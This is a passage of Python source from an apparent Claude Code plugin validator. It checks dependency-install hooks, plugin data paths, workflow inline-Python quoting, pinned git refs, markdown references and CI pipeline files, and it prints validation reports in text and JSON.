        "yarn.lock",
        "bun.lock",
    )
    matched_manifests: list[str] = [m for m in node_manifests if (plugin_root / m).is_file()]
    has_runtime_deps = bool(matched_manifests)

    if has_runtime_deps:
        # Look for a SessionStart hook in either of the two valid hook
        # locations. The hook command must mention an installer command
        # AND target ${CLAUDE_PLUGIN_DATA} for the install destination.
        hook_files = [
            plugin_root / "hooks" / "hooks.json",
            plugin_root / ".claude-plugin" / "hooks" / "hooks.json",
        ]
        installer_keywords = re.compile(
            r"(npm\s+(ci|install)|pnpm\s+install|yarn\s+install|bun\s+install|"
            r"pip\s+install|uv\s+(pip\s+install|sync)|cargo\s+(build|install)|"
            r"go\s+(install|build))",
            re.IGNORECASE,
        )
        plugin_data_token = "CLAUDE_PLUGIN_DATA"
        installer_found = False
        for hook_file in hook_files:
            if not hook_file.is_file():
                continue
            try:
                hook_content = hook_file.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            # Cheap textual check — full JSON parsing happens in validate_hook.
            # We just need to know whether the file mentions both an installer
            # command AND ${CLAUDE_PLUGIN_DATA}, anywhere inside a SessionStart
            # block.
            if (
                "SessionStart" in hook_content
                and plugin_data_token in hook_content
                and installer_keywords.search(hook_content)
            ):
                installer_found = True
                break

        if not installer_found:
            manifests_str = ", ".join(matched_manifests)
            report.warning(
                f"[RC-DATA-INSTALLER-001] Plugin declares runtime dependencies in "
                f"{manifests_str} but has no SessionStart hook installing them into "
                "${CLAUDE_PLUGIN_DATA}. Without one, the plugin either has to bundle "
                "node_modules/site-packages (which inflates the install + gets wiped on every "
                "plugin update because ${CLAUDE_PLUGIN_ROOT} is replaced wholesale), or it "
                "depends on the user having the tooling globally installed (fragile). The "
                "canonical pattern is a SessionStart hook that runs `npm ci --prefix "
                "$CLAUDE_PLUGIN_DATA` (or `uv pip install --target $CLAUDE_PLUGIN_DATA/...` "
                "for Python, etc.) on first session and is a no-op afterwards. See "
                "https://code.claude.com/docs/en/plugins-reference#persistent-data-directory."
            )

    # Check that no script / hook / config file references
    # ${CLAUDE_PLUGIN_ROOT}/<dep-dir>/ — that path is wiped on every update.
    # Mutable state belongs in ${CLAUDE_PLUGIN_DATA}/.
    #
    # Markdown files are EXCLUDED from this scan: they are documentation
    # that often quotes both correct and incorrect patterns side-by-side
    # (e.g. plugin-diagnoser.md has rule descriptions that LITERALLY
    # contain the bad pattern as the thing being detected). Quoting an
    # anti-pattern is fine; we only flag actual code that ships the
    # anti-pattern.
    plugin_root_dep_re = re.compile(
        r"\$\{?CLAUDE_PLUGIN_ROOT\}?/(node_modules|\.venv|venv|vendor|site-packages|target|__pypackages__)\b"
    )
    code_extensions = {".py", ".sh", ".js", ".ts", ".mjs", ".cjs", ".json", ".yml", ".yaml", ".toml"}
    scan_dirs = [
        plugin_root / "scripts",
        plugin_root / "hooks",
        plugin_root / "git-hooks",
        plugin_root,  # for top-level config files like .mcp.json
    ]
    for scan_dir in scan_dirs:
        if not scan_dir.is_dir():
            continue
        for f in scan_dir.rglob("*"):
            if not f.is_file():
                continue
            if f.suffix.lower() not in code_extensions:
                continue
            # Skip files inside node_modules / .venv / vendor / etc. (we don't
            # care about third-party code) and inside `_dev` working dirs.
            try:
                rel_parts = f.relative_to(plugin_root).parts
            except ValueError:
                continue
            # Skip third-party / build dirs (we don't audit code we don't own)
            # AND skip tests/ — test files often embed the very anti-patterns
            # they exist to detect, as fixtures. Same idea as why
            # validate_security skips test files for password / token regexes.
            if any(
                p
                in {
                    "node_modules",
                    ".venv",
                    "venv",
                    "vendor",
                    "__pypackages__",
                    "target",
                    "build",
                    "dist",
                    "_dev",
                    "tests",
                    "tests_dev",
                }
                or p.endswith("_dev")
                for p in rel_parts
            ):
                continue
            try:
                text = f.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            for match in plugin_root_dep_re.finditer(text):
                rel = str(f.relative_to(plugin_root))
                line_no = text[: match.start()].count("\n") + 1
                report.major(
                    f"[RC-DATA-WRONG-ROOT-001] {rel}:{line_no} references "
                    f"${{CLAUDE_PLUGIN_ROOT}}/{match.group(1)}/ — that path is wiped on "
                    f"every plugin update. Use ${{CLAUDE_PLUGIN_DATA}}/{match.group(1)}/ "
                    "instead, and install via a SessionStart hook.",
                    file=rel,
                    line=line_no,
                )

    # Check that non-plugin artifacts that may exist are ignored
    # Look for actual artifacts in the tree that should be gitignored
    artifact_patterns = {
        "*.pyc": "Compiled Python files",
        ".DS_Store": "macOS metadata",
        "Thumbs.db": "Windows metadata",
    }
    for pattern_glob, desc in artifact_patterns.items():
        # Use gitignore-aware rglob — only find artifacts NOT covered by .gitignore
        if _gi:
            matches = [p for p in _gi.rglob(pattern_glob)]
        else:
            matches = list(plugin_root.rglob(pattern_glob))
        if matches:
            sample = matches[0].relative_to(plugin_root)
            report.warning(f"Found {len(matches)} {desc} file(s) (e.g. {sample}) that are not gitignored")


# Regex to find inline Python blocks inside YAML: `python3 -c "..."`  or `python -c "..."`
# Captures the Python code string passed to -c.
_YAML_INLINE_PYTHON_RE = re.compile(
    r'python3?\s+-c\s+"([^"]*(?:"[^"]*"[^"]*)*)"',
    re.DOTALL,
)

# Dangerous pattern: dict["key"] or dict['key'] inside an f-string.
# In YAML inline Python the shell strips the inner quotes, causing NameError.
# Matches: {expr["key"]}, {expr['key']}, {expr.method()["key"]} etc.
_FSTRING_DICT_BRACKET_RE = re.compile(
    r"""\{[^}]*\[["'][^"']+["']\][^}]*\}""",
)


def validate_workflow_inline_python(plugin_root: Path, report: ValidationReport) -> None:
    """Scan GitHub Actions workflow files for dangerous inline Python patterns.

    When a YAML workflow uses ``python3 -c "..."`` (double-quoted shell string),
    dict bracket access like source["repo"] inside f-strings will fail at
    runtime because the shell strips the inner double quotes before Python
    sees the code.  Python then interprets the bare word as an undefined
    variable name, causing NameError.

    This validator catches that pattern and reports it as MAJOR.
    """
    workflows_dir = plugin_root / ".github" / "workflows"
    if not workflows_dir.is_dir():
        return

    yaml_files = list(workflows_dir.glob("*.yml")) + list(workflows_dir.glob("*.yaml"))
    if not yaml_files:
        return

    found_any = False
    for yaml_path in yaml_files:
        try:
            content = yaml_path.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            continue

        rel_path = str(yaml_path.relative_to(plugin_root))

        # Find all inline Python blocks
        for match in _YAML_INLINE_PYTHON_RE.finditer(content):
            python_code = match.group(1)
            block_start_offset = match.start()

            # Search for f-strings with dict bracket access
            for bad_match in _FSTRING_DICT_BRACKET_RE.finditer(python_code):
                abs_offset = block_start_offset + bad_match.start()
                line_num = content[:abs_offset].count("\n") + 1
                snippet = bad_match.group(0)
                found_any = True
                report.major(
                    f"Inline Python uses dict bracket access in f-string: {snippet} -- shell quoting will strip inner quotes causing NameError. Extract value into a local variable first.",
                    rel_path,
                    line_num,
                )

    if not found_any and yaml_files:
        report.passed(f"No inline Python quoting issues in {len(yaml_files)} workflow file(s)")


# =============================================================================
# Publish-gate enforcement of a RESOLVABLE CPV git ref (TRDD-35BN0TEI)
# =============================================================================
# A plugin migrated by an OLD CPV (<=v2.137, pre-#139) pins
# `git+https://github.com/Emasoft/claude-plugins-validation@main` in its
# `.github/workflows/*.yml`. CPV's default branch is `master`, so `@main` does
# NOT exist: the GitHub runner's `uvx --from git+...@main` 404s
# (`Git operation failed / Updating ... (main)`) and the workflow red-CIs
# forever. The CIP-6 detector (cpv_ci_parity_checks) and the `repin_stale_cpv_ref`
# fixer (standardize_plugin) already encode this rule, but BOTH live OUTSIDE the
# publish gate -- so a `@main` workflow passed `validate_plugin --strict`
# (publish.py Gate 3) and got pushed anyway, red-CIing post-push. This validator
# closes that hole: the SAME rule, enforced by the gate the publish pipeline
# already runs, so a stale ref BLOCKS the publish instead. The fix is the existing
# `standardize --fix` (repins in place) or the PyPI fetch form.
#
# THIS RULE IS DUPLICATED IN THREE PLACES (kept in sync BY CONSTRUCTION, not by
# import -- matching the established standardize<->CIP-6 design). KEEP IDENTICAL:
#   1. scripts/cpv_ci_parity_checks.py  (_is_resolvable_cpv_ref / CIP-6 detector)
#   2. scripts/standardize_plugin.py    (_cpv_ref_is_valid / repin_stale_cpv_ref)
#   3. HERE                             (_cpv_workflow_ref_is_valid / this gate)
# (SSOT consolidation into one shared helper is a noted follow-up; TRDD-35BN0TEI.)
# re2-safe: only character classes, anchors, bounded quantifiers -- no lookaround.
_CPV_REF_PIN_RE = re.compile(
    r"git\+https://github\.com/Emasoft/claude-plugins-validation(?:\.git)?@(?P<ref>[^\s'\"#]+)"
)
_CPV_VALID_SEMVER_TAG_RE = re.compile(r"^v\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.+-]+)?$")
_CPV_VALID_SHA_RE = re.compile(r"^[0-9a-fA-F]{7,40}$")


def _cpv_workflow_ref_is_valid(ref: str) -> bool:
    """Return True when ``ref`` is a CPV git ref that actually resolves.

    Valid = ``master`` (CPV's default branch), a ``v<semver>`` tag, or a 7-40 hex
    commit SHA. Everything else (``main`` / ``develop`` / ``HEAD`` / a branch
    name) does not resolve on the runner and red-CIs. EXACT copy of the CIP-6 /
    repin rule (see the three-way sync note above).
    """
    if ref == "master":
        return True
    if _CPV_VALID_SEMVER_TAG_RE.match(ref):
        return True
    return bool(_CPV_VALID_SHA_RE.match(ref))


def validate_workflow_cpv_ref(plugin_root: Path, report: ValidationReport) -> None:
    """Block a STALE/INVALID CPV git ref pinned in a workflow (TRDD-35BN0TEI).

    Scans ``.github/workflows/*.yml|*.yaml`` for a
    ``git+https://github.com/Emasoft/claude-plugins-validation[.git]@<ref>`` pin
    and reports MAJOR when ``<ref>`` does not resolve (anything but ``master`` /
    a ``v<semver>`` tag / a 7-40 hex SHA). MAJOR blocks ``--strict``, so
    ``publish.py`` Gate 3 refuses to ship a `@main`-pinned pipeline that would
    red-CI on the runner. A correctly-pinned workflow -- or one with no
    ``git+...@`` CPV pin at all (e.g. a local-script invocation) -- produces
    ZERO findings: two-sided by construction.

    Scopes to workflow CONTENT only (never the install slug), so it fires the
    same on a fresh pre-publish source as on an installed plugin.
    """
    workflows_dir = plugin_root / ".github" / "workflows"
    if not workflows_dir.is_dir():
        return

    yaml_files = list(workflows_dir.glob("*.yml")) + list(workflows_dir.glob("*.yaml"))
    if not yaml_files:
        return

    found_any = False
    for yaml_path in sorted(yaml_files):
        try:
            content = yaml_path.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            continue
        rel_path = str(yaml_path.relative_to(plugin_root))
        for match in _CPV_REF_PIN_RE.finditer(content):
            ref = match.group("ref")
            if _cpv_workflow_ref_is_valid(ref):
                continue
            line_num = content[: match.start()].count("\n") + 1
            found_any = True
            report.major(
                f"Workflow pins a non-resolvable CPV ref `@{ref}` "
                f"(git+https://github.com/Emasoft/claude-plugins-validation@{ref}) -- CPV's "
                f"default branch is `master`, so `uvx --from git+...@{ref}` 404s on the runner "
                f"and the workflow red-CIs. Re-pin to a `@v<semver>` tag (the canonical form the "
                f"generator emits), `@master`, or a commit SHA -- run `standardize --fix` to "
                f"repin in place.",
                rel_path,
                line_num,
            )

    if not found_any and yaml_files:
        report.passed(f"All CPV workflow refs resolve in {len(yaml_files)} workflow file(s)")


def print_results(report: ValidationReport, verbose: bool = False, strict: bool = False) -> None:
    """Print validation results in human-readable format.

    ``strict`` mirrors the CLI ``--strict`` flag. When set, the verdict banner
    is computed from ``exit_code_strict()`` (which blocks on NIT) so the
    printed banner agrees with the process exit code — otherwise a NIT-only
    strict run would print "All checks passed" while exiting 4 (NIT-block),
    contradicting itself for the reader/CI.
    """
    colors = COLORS

    counts = {"CRITICAL": 0, "MAJOR": 0, "MINOR": 0, "NIT": 0, "WARNING": 0, "INFO": 0, "PASSED": 0}
    for r in report.results:
        counts[r.level] += 1

    print("\n" + "=" * 60)
    print("Plugin Validation Report")
    print("=" * 60)

    print("\nSummary:")
    print(f"  {colors['CRITICAL']}CRITICAL: {counts['CRITICAL']}{colors['RESET']}")
    print(f"  {colors['MAJOR']}MAJOR:    {counts['MAJOR']}{colors['RESET']}")
    print(f"  {colors['MINOR']}MINOR:    {counts['MINOR']}{colors['RESET']}")
    print(f"  {colors['NIT']}NIT:      {counts['NIT']}{colors['RESET']}")
    print(f"  {colors['WARNING']}WARNING:  {counts['WARNING']}{colors['RESET']}")
    if verbose:
        print(f"  {colors['INFO']}INFO:     {counts['INFO']}{colors['RESET']}")
        print(f"  {colors['PASSED']}PASSED:   {counts['PASSED']}{colors['RESET']}")

    print("\nDetails:")
    for r in report.results:
        if r.level == "PASSED" and not verbose:
            continue
        if r.level == "INFO" and not verbose:
            continue

        color = colors[r.level]
        reset = colors["RESET"]
        file_info = f" ({r.file})" if r.file else ""
        line_info = f":{r.line}" if r.line else ""
        print(f"  {color}[{r.level}]{reset} {r.message}{file_info}{line_info}")

    print("\n" + "-" * 60)
    # Under --strict the displayed verdict MUST match the strict exit code
    # (which blocks on NIT); otherwise a NIT-only strict run prints "passed"
    # while exiting non-zero.
    verdict_code = report.exit_code_strict() if strict else report.exit_code
    if verdict_code == 0:
        print(f"{colors['PASSED']}✓ All checks passed{colors['RESET']}")
    elif verdict_code == 1:
        print(f"{colors['CRITICAL']}✗ CRITICAL issues found - plugin will not work{colors['RESET']}")
    elif verdict_code == 2:
        print(f"{colors['MAJOR']}✗ MAJOR issues found - significant problems{colors['RESET']}")
    elif verdict_code == 3:
        print(f"{colors['MINOR']}! MINOR issues found - may affect UX{colors['RESET']}")
    else:  # EXIT_NIT (4) — only reachable under --strict
        print(f"{colors['NIT']}! NIT issues found - blocked by --strict{colors['RESET']}")

    # Machine-readable summary for CI/CD parsing
    print(
        f"SUMMARY: CRITICAL={counts['CRITICAL']} MAJOR={counts['MAJOR']} MINOR={counts['MINOR']} NIT={counts['NIT']} WARNING={counts['WARNING']}"
    )

    print()

    # Security-gate banners (Gate A — execution-class / Gate B — leaks+harden).
    # RT4-plugin-gate-weaker-than-security: the plugin gate now runs an
    # execution-class security pass, so the Gate-A "Devitalize" banner must be
    # reachable HERE (the user-facing host of that banner) — not only from the
    # standalone `security` subcommand. Mirrors print_compact_summary: when a
    # gate fires, render its banner (it already points at the right WORK agent)
    # and SKIP the generic fixer block to avoid double-pointing at a fixer.
    # Purely additive informational text — never mutates a count or the exit
    # code (the banner explains an already-INVALID verdict, it does not invent
    # one). No-op when no execution-class / leak finding is present.
    from cpv_validation_common import (
        _classify_security_buckets,
        _print_fixer_recommendation,
        _print_security_gate_banners,
    )

    if _classify_security_buckets(report):
        _print_security_gate_banners(report, None)
    else:
        _print_fixer_recommendation(report, None)


def print_json(report: ValidationReport) -> None:
    """Print validation results as JSON."""
    output = {
        "exit_code": report.exit_code,
        "counts": {
            "critical": sum(1 for r in report.results if r.level == "CRITICAL"),
            "major": sum(1 for r in report.results if r.level == "MAJOR"),
            "minor": sum(1 for r in report.results if r.level == "MINOR"),
            "nit": sum(1 for r in report.results if r.level == "NIT"),
            "warning": sum(1 for r in report.results if r.level == "WARNING"),
            "info": sum(1 for r in report.results if r.level == "INFO"),
            "passed": sum(1 for r in report.results if r.level == "PASSED"),
        },
        "results": [
            {
                "level": r.level,
                "message": r.message,
                "file": r.file,
                "line": r.line,
                # Additive fix-routing metadata (Phase 2, TRDD-GVMOKJBB): forward
                # the fixable/fix_id SSOT so cpv_fix_ledger's MECH bucket and
                # cpv_codemod's `apply --json` can consume it. Emitted ONLY when
                # set (mirroring ValidationResult.to_dict), so a NON-fixable
                # finding's dict is byte-identical to before — the 4 keys above,
                # always present. Without this forward, a validator can TAG a
                # finding fixable but the tag is silently dropped here and never
                # reaches the JSON consumer (this emitter had drifted from the
                # schema, dropping fixable/fix_id/category/suggestion/phase).
                **({"fixable": True} if r.fixable else {}),
                **({"fix_id": r.fix_id} if (r.fixable and r.fix_id) else {}),
            }
            for r in report.results
        ],
    }
    # RT4-plugin-gate-weaker-than-security — additive, machine-observable
    # security-gate signal mirroring validate_security's --json contract
    # (#70-A). The human banner ASCII is NEVER printed under --json (stdout must
    # stay pure JSON); consumers learn which gate fired from this object. Purely
    # derived from the already-built report — changes no count and no exit code.
    from cpv_validation_common import _classify_security_buckets

    _gate_buckets = _classify_security_buckets(report)
    output["security_gates"] = {
        "A": "A" in _gate_buckets,
        "B": "B" in _gate_buckets,
        "C": "C" in _gate_buckets,
        "devitalize_recommended": "A" in _gate_buckets,
        "leaks_preventer_recommended": bool(_gate_buckets & {"B", "C"}),
    }
    print(json.dumps(output, indent=2))


def validate_md_content_references(plugin_root: Path, report: ValidationReport) -> None:
    """Validate file path references and URLs inside all .md files in the plugin.

    Scans commands/, agents/, skills/, README.md for:
    - Broken file path references (markdown links and backtick paths)
    - Dead URLs (HTTP HEAD check with sanitization)
    """
    # Collect all .md files to check (excluding tests/, _dev/ dirs, and CHANGELOG)
    md_files: list[Path] = []

    # README.md at root
    readme = plugin_root / "README.md"
    if readme.exists():
        md_files.append(readme)

    # Commands
    commands_dir = plugin_root / "commands"
    if commands_dir.is_dir():
        md_files.extend(commands_dir.glob("*.md"))

    # Agents
    agents_dir = plugin_root / "agents"
    if agents_dir.is_dir():
        md_files.extend(agents_dir.glob("*.md"))

    # Skills (SKILL.md + references/*.md). EXEMPT vendor-doc references
    # — those are canonical embedded copies fetched from code.claude.com,
    # and their cross-links use `/en/...` paths that target other Claude
    # docs, not files inside the plugin. We keep them byte-identical to
    # the upstream so doc updates produce clean diffs.
    VENDOR_DOC_NAMES = {"plugins-reference.md", "skills-reference.md"}
    skills_dir = plugin_root / "skills"
    if skills_dir.is_dir():
        for skill_dir in skills_dir.iterdir():
            if skill_dir.is_dir():
                skill_md = skill_dir / "SKILL.md"
                if skill_md.exists():
                    md_files.append(skill_md)
                refs_dir = skill_dir / "references"
                if refs_dir.is_dir():
                    md_files.extend(f for f in refs_dir.glob("*.md") if f.name not in VENDOR_DOC_NAMES)

    if not md_files:
        return

    report.info(f"Checking content references in {len(md_files)} .md file(s)")

    # Patterns to skip in path validation (common false positives)
    skip_patterns = {
        "node_modules/",
        "__pycache__/",
        ".git/",
        "<placeholder",
        "${",
        "$(",
    }

    # Shared URL cache across all files (avoid re-checking same URL)
    url_cache: dict[str, bool] = {}

    # Reference files (skills/*/references/*.md) are documentation about the USER's
    # plugin, not about this plugin. Backtick paths in those files describe the target
    # plugin structure, so they should not be validated as references to files in THIS
    # plugin. We pass a flag to downgrade plugin-internal backtick path errors to
    # WARNING in reference files.
    for md_file in sorted(md_files):
        # Reference files and command files describe the USER's plugin structure,
        # not this plugin. Backtick paths there are documentation examples.
        is_reference_doc = "/references/" in str(md_file) or "/commands/" in str(md_file)
        # Validate file path references
        validate_md_file_paths(
            md_file, plugin_root, report, skip_patterns=skip_patterns, is_reference_doc=is_reference_doc
        )
        # Validate URLs
        validate_md_urls(md_file, plugin_root, report, url_cache=url_cache)


def validate_pipeline_readiness(plugin_root: Path, report: ValidationReport) -> None:
    """Check that the plugin has CI/CD pipeline infrastructure.

    Profile-aware (TRDD-e9f13df1, issue #130): a ``remote-validation`` plugin
    intentionally ships NO vendored CPV validator scripts — validation is the
    remote ``cpv-remote-validate --strict`` gate, run identically in publish.py,
    the hooks, and CI. CPV recognizes this shape so the readiness output
    documents it (an INFO line) rather than treating the deliberate absence of
    vendored validators as a gap. The actually-recommended pipeline files
    (publish.py, cliff.toml, the notify workflow) are still checked normally —
    a remote-validation plugin HAS those; recognizing the profile is
    informative, never suppressive.
    """
    # Pipeline profile (informative; never relaxes a check below). Resolution
    # fails SAFE to `standard` on any error.
    try:
        from cpv_pipeline_profile import PROFILE_STANDARD, resolve_pipeline_profile

        profile = resolve_pipeline_profile(plugin_root)
    except Exception:  # noqa: BLE001 — advisory; any failure falls back to `standard` (unchanged behavior)
        profile = "standard"
        PROFILE_STANDARD = "standard"  # noqa: N806 — local fallback constant when the import failed
    if profile != PROFILE_STANDARD:
        report.info(
            f"Detected `{profile}` pipeline profile — CPV judges this plugin's "
            f"canonical-pipeline files against the {profile} canon (e.g. a "
            f"remote-validation plugin's intentionally-absent vendored "
            f"validators are not a gap; its remote `cpv-remote-validate` gate "
            f"is the validation path). The shared canon (SHA-pins, "
            f"least-privilege permissions, notify chain, version consistency, "
            f"atomic push) is still fully enforced."
        )

    # binary-release STRUCTURAL recognition (#115 / Piece C2a). A binary-release
    # plugin's release workflow is toolchain-specific and can NEVER byte-match
    # the standard `release.yml`, so reporting it as a "missing standard
    # release.yml" gap is a false flag. Recognize it STRUCTURALLY instead: a
    # CANONICAL binary-release workflow (SHA-pinned third-party actions +
    # least-privilege split + a checksum step + a build matrix) is documented as
    # the recognized canon (INFO, not a gap); a DEFICIENT one (missing any of
    # the four) WARNs, naming the missing requirement(s). SELECTOR not
    # SUPPRESSOR (TRDD-02e1672b) — declaring binary-release HOLDS the plugin to
    # the binary-release canon; a deficient workflow is never silenced. Fails
    # SAFE (skips, no false claim) on any error.
    if profile == "binary-release":
        try:
            from cpv_pipeline_profile import (
                binary_release_canonical_status,
                binary_release_release_workflow,
            )

            br_wf = binary_release_release_workflow(plugin_root)
            if br_wf is not None:
                br_canonical, br_missing = binary_release_canonical_status(plugin_root)
                try:
                    br_rel = str(br_wf.relative_to(plugin_root))
                except ValueError:
                    br_rel = br_wf.name
                if br_canonical:
                    report.info(
                        f"Recognized `{br_rel}` as a CANONICAL binary-release "
                        f"release workflow (SHA-pinned third-party actions, a "
                        f"least-privilege permissions split, a checksum step, "
                        f"and a build matrix over targets — the janitor "
                        f"`memgrep-release.yml` shape). This is NOT a 'missing "
                        f"standard release.yml' gap: a binary-release workflow "
                        f"is toolchain-specific and is judged structurally, not "
                        f"by byte-matching the standard template."
                    )
                else:
                    report.warning(
                        f"`{br_rel}` is this plugin's binary-release workflow "
                        f"but is NOT yet a CANONICAL binary-release release "
                        f"workflow — it is missing: {', '.join(br_missing)}. A "
                        f"binary-release workflow is judged structurally (it "
                        f"cannot byte-match the standard `release.yml`); add the "
                        f"missing requirement(s) above. Advisory and "
                        f"non-blocking; the `binary-release` profile is a "
                        f"SELECTOR not a suppressor (TRDD-02e1672b)."
                    )
        except Exception:  # noqa: BLE001 — recognition is advisory; any failure skips it (no false claim either way)
            pass

    # Pre-push hook
    hook_paths = [
        plugin_root / ".githooks" / "pre-push",
        plugin_root / "git-hooks" / "pre-push",
    ]
    if any(p.exists() for p in hook_paths):
        report.passed("Pre-push hook found")
    else:
        report.minor(
            "No pre-push hook found (.githooks/pre-push or git-hooks/pre-push) — recommended for quality gates"
        )

    # Publish script
    if (plugin_root / "scripts" / "publish.py").exists():
        report.passed("scripts/publish.py found")
    else:
        report.warning("No scripts/publish.py found — recommended for release automation")

    # Changelog config
    if (plugin_root / "cliff.toml").exists():
        report.passed("cliff.toml found (git-cliff changelog)")
    else:
        report.warning("No cliff.toml found — recommended for automated changelog generation")

    # GitHub workflows
    workflows_dir = plugin_root / ".github" / "workflows"
    if workflows_dir.is_dir() and list(workflows_dir.glob("*.yml")):
        report.passed("GitHub workflows found")
    else:
        report.minor("No .github/workflows/*.yml found — recommended for CI/CD automation")

    # Marketplace notification workflow
    if workflows_dir.is_dir():
        notify_names = ["notify-marketplace.yml", "notify.yml", "marketplace-notify.yml"]
        if any((workflows_dir / n).exists() for n in notify_names):
            report.passed("Marketplace notification workflow found")
        else:
            report.warning("No notify-marketplace.yml workflow — plugin updates won't auto-notify marketplaces")


# Regex matching `scripts/<name>.py` references in workflow / hook / template
# files. Captures the script name only (no leading `scripts/` for cleaner
# error messages).
#   - The lookbehind `(?<![\w./])` blocks matches inside paths like
#     `prefix/scripts/x.py` from being conflated with the project's scripts/.
#   - The lookahead `(?![\w.])` blocks matches like `scripts/x.py.bak.gz` —
#     a trailing `.` means the `.py` is part of a longer extension chain
#     (backup, archive, .pyc-derivative), not an actual script reference.
_SCRIPT_REF_RE = re.compile(r"(?<![\w./])scripts/([A-Za-z_][A-Za-z0-9_]*\.py)(?![\w.])")


def _ref_after_comment_marker(line: str, match_start: int) -> bool:
    """True iff the match begins after an (unquoted) ``#`` comment marker on the line.

    The dangling-ref targets — ``.github/workflows/*.yml|*.yaml``, the
    ``.git/hooks/pre-push`` + ``git-hooks/*`` shell hooks, the
    plugin-validation-skill reference hook, and ``setup_plugin_pipeline.py`` —
    all use ``#`` as their comment marker (YAML, shell, Python). Everything after
    an unquoted ``#`` is never executed, so a ``scripts/*.py`` token sitting in a
    comment tail can never be a live invocation: skipping it cannot hide a real
    dangling reference (FP issue #127). A real ``run:``/invocation token before
    the ``#`` still records.

    Quote state is tracked so a ``#`` inside a quoted string is NOT treated as a
    comment marker (defensive: ``run: echo "scripts/x.py # not a comment"``).
    Script-ref paths never contain ``#``, so the marker we care about is always
    outside the matched token.
    """
    in_s = in_d = False
    for ch in line[:match_start]:
        if ch == "'" and not in_d:
            in_s = not in_s
        elif ch == '"' and not in_s:
            in_d = not in_d
        elif ch == "#" and not in_s and not in_d:
            return True
    return False


def _collect_script_refs(text: str, source_label: str) -> list[tuple[str, int, str]]:
    """Yield (script_name, line_no, line_excerpt) for every scripts/*.py
    reference found in ``text``. Used by ``validate_pipeline_script_refs``.
    """
    refs: list[tuple[str, int, str]] = []
    for line_no, line in enumerate(text.splitlines(), start=1):
        for match in _SCRIPT_REF_RE.finditer(line):
            # FP issue #127: a path inside a `#` comment is documentation, not a
            # live invocation — skip it so a comment mentioning a removed script
            # (e.g. "# Issue #11: removed local scripts/validate_plugin.py")
            # does not flag as a dangling reference. A real run: invocation on
            # the same line (before the `#`) still records.
            if _ref_after_comment_marker(line, match.start()):
                continue
            script_name = match.group(1)
            excerpt = line.strip()
            if len(excerpt) > 120:
                excerpt = excerpt[:117] + "..."
            refs.append((script_name, line_no, excerpt))
    _ = source_label  # kept for caller-side diagnostics
    return refs


def validate_pipeline_script_refs(plugin_root: Path, report: ValidationReport) -> None:
    """Detect dangling `scripts/<name>.py` references in pipeline surface area.

    Why this exists: every time a script in `scripts/` is renamed or removed,
    multiple consumers silently break — `.github/workflows/*.yml`, the locally
    installed `.git/hooks/pre-push`, the published `setup_plugin_pipeline.py`
    template, and the `plugin-validation-skill` reference hooks all hardcode
    `scripts/<name>.py` paths. The v2.65.0 lint consolidation triggered exactly
    this regression — `lint_files.py` was removed but CI + the local hook still
    invoked it, breaking every push until a follow-up patch.

    This validator scans every place a stale reference could hide and emits
    MAJOR for each missing target. Catching dangling references at PR / release
    time is the only durable fix; the alternative is rediscovering the bug
    every time a script gets renamed.
    """
    scripts_dir = plugin_root / "scripts"
    if not scripts_dir.is_dir():
        return  # plugin without a scripts/ folder — nothing to check

    # Files that may legitimately hardcode `scripts/<name>.py` paths.
    targets: list[tuple[Path, str]] = []

    # GitHub workflows.
    workflows_dir = plugin_root / ".github" / "workflows"
    if workflows_dir.is_dir():
        for wf in sorted(workflows_dir.glob("*.yml")):
            targets.append((wf, f".github/workflows/{wf.name}"))
        for wf in sorted(workflows_dir.glob("*.yaml")):
            targets.append((wf, f".github/workflows/{wf.name}"))

    # Locally-installed git hook (only present in dev checkouts; absent in
    # cache installs because .git/ isn't shipped, so this is naturally a
    # no-op for end users).
    installed_hook = plugin_root / ".git" / "hooks" / "pre-push"
    if installed_hook.is_file():
        targets.append((installed_hook, ".git/hooks/pre-push"))

    # Git-tracked source-of-truth hook templates under git-hooks/. These
    # are the canonical templates that setup_git_hooks.py copies into
    # .git/hooks/, so a stale ref here propagates to every fresh install.
    # The v2.65.0 lint_files.py-removal regression slipped through because
    # this directory was NOT scanned by the validator — the installed
    # copy under .git/hooks/ had been hand-patched, so .git/hooks/pre-push
    # passed validation while git-hooks/pre-push (the source) still had
    # the dangling reference.
    git_hooks_dir = plugin_root / "git-hooks"
    if git_hooks_dir.is_dir():
        for hook_name in (
            "pre-push",
            "pre-commit",
            "post-rewrite",
            "post-merge",
            "commit-msg",
        ):
            tracked_hook = git_hooks_dir / hook_name
            if tracked_hook.is_file():
                targets.append((tracked_hook, f"git-hooks/{hook_name}"))

    # Plugin-validation-skill reference hooks (template that gets copied into
    # plugins by setup_plugin_pipeline).
    pvs_hook = plugin_root / "skills" / "plugin-validation-skill" / "references" / "pre-push-hook.py"
    if pvs_hook.is_file():
        targets.append((pvs_hook, "skills/plugin-validation-skill/references/pre-push-hook.py"))

    # The pipeline-template generator itself — its embedded PRE_PUSH_HOOK
    # string is the source-of-truth for newly-scaffolded plugins.
    pipeline_gen = plugin_root / "scripts" / "setup_plugin_pipeline.py"
    if pipeline_gen.is_file():
        targets.append((pipeline_gen, "scripts/setup_plugin_pipeline.py"))

    if not targets:
        return

    # Build the set of scripts that actually exist on disk.
    existing_scripts = {p.name for p in scripts_dir.glob("*.py")}

    for path, label in targets:
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        for script_name, line_no, excerpt in _collect_script_refs(text, label):
            if script_name in existing_scripts:
                continue
            report.major(
                f"Dangling reference to scripts/{script_name} in {label}:{line_no} — "
                f"the script does not exist. Update the reference or restore the file. "
                f"Line: {excerpt}",
                file=label,
                line=line_no,
            )


# ── RC-WORKFLOW-PATH-BROKEN (issue #21 ask #2) ────────────────────────────────
# Path-shape heuristic: a token is "path-like" if it starts with one of these
# prefixes or carries a trailing ".sh"/".py" extension. We DELIBERATELY keep
# this list narrow — broadening it (e.g. matching every `*` or every relative
# segment) starts catching glob-formatted matrix variables, makefile vars,
# bash arrays, etc. The narrow prefix list catches the documented symptom
# (post-migration .sh references that no longer exist) without false-positives
# on legitimate workflow constructs.
_WORKFLOW_PATH_PREFIXES: tuple[str, ...] = (
    "scripts/",
    "tests/",
    ".github/",
    ".githooks/",
    "git-hooks/",
    "./",
)

# Glob meta-characters in the same shell sense Python's glob module uses.
